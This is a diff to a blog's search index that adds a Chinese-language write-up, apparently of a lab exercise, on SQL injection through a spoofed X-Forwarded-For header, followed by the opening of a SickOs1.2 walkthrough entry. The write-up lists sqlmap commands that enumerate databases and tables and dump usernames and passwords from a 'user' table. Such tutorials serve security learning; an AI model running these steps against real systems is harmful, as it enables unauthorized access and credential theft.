@@ -1,6 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>X-Forwarded-For注入</title>
+    <url>/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="0x00-fuzz测试"><a href="#0x00-fuzz测试" class="headerlink" title="0x00 fuzz测试"></a><strong>0x00 fuzz测试</strong></h1><p>打开页面发现是个登陆后台，登录框随便输入试试<br>发现有乱码 到firefox的F12看看响应</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112017843.png" alt="image-20200316112017843"></p>
+<p>告诉我们ip已经记录　<br>服务端获取客户端IP地址的方式,其中一种是通过读取请求中X-Forwarded-For的字段值，确认服务端是不是使用这种方式获取客户端IP地址<br>编辑刚才的请求，在请求头中加入X-Forwarded-For:121.8.146.99(这个是我们伪造的IP地址，随便填一个合法的IP地址即可)，然后重新发送</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112843791.png" alt="image-20200316112843791"></p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112913342.png" alt="image-20200316112913342"></p>
+<p>可以看到，之前随意填的X-Forwarded-For字段中的IP地址 121.8.146.99 已经被记录了，这就确认了服务端是通过读取X-Forwarded-For的字段值来获取客户端的IP地址的<br>下面直接用SQLMAP确认X-Forwarded-For存在SQL注入漏洞</p>
+<h1 id="0x01-sqlmap跑注入"><a href="#0x01-sqlmap跑注入" class="headerlink" title="0x01 sqlmap跑注入"></a><strong>0x01 sqlmap跑注入</strong></h1><p>将第二次登录请求的信息摘下来，新建成txt文件，这里我命名为x-forwarded-for.txt，并将x-forwarded-for的值改为*</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316113807808.png" alt="image-20200316113807808"></p>
+<p>sqlmap -r x-forwarded-for.txt –batch<br>需要在x-forwarded-for.txt文件所在的目录中跑</p>
+<h2 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h2><p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114245921.png" alt="image-20200316114245921"></p>
+<h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><p>sqlmap -r x-forwarded-for.txt –batch –dbs</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114550478.png" alt="image-20200316114550478"></p>
+<h2 id="查询当前数据库库"><a href="#查询当前数据库库" class="headerlink" title="查询当前数据库库"></a>查询当前数据库库</h2><p>sqlmap -r x-forwarded-for.txt –batch –current-db</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114645795.png" alt="image-20200316114645795"></p>
+<h2 id="查询获取数据库中表"><a href="#查询获取数据库中表" class="headerlink" title="查询获取数据库中表"></a>查询获取数据库中表</h2><p>sqlmap -r x-forwarded-for.txt –batch -D “webcalendar” –tables</p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114838304.png" alt="image-20200316114838304"></p>
+<h2 id="查询表的字段"><a href="#查询表的字段" class="headerlink" title="查询表的字段"></a>查询表的字段</h2><p>以user为例：sqlmap -r x-forwarded-for.txt –batch -T “user”  -D “webcalendar” –columns </p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316115145834.png" alt="image-20200316115145834"></p>
+<h2 id="查询表的内容"><a href="#查询表的内容" class="headerlink" title="查询表的内容"></a>查询表的内容</h2><p>sqlmap -r x-forwarded-for.txt -T “user” -D “webcalendar” -C “id,username,password” –batch –dump </p>
+<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316122534470.png" alt="image-20200316122534470"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SickOs1.2</title>
     <url>/2020/03/15/SickOs1-2/</url>
     <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/15/SickOs1-2/image-20200315180547120.png" alt="image-20200315180547120"></p>
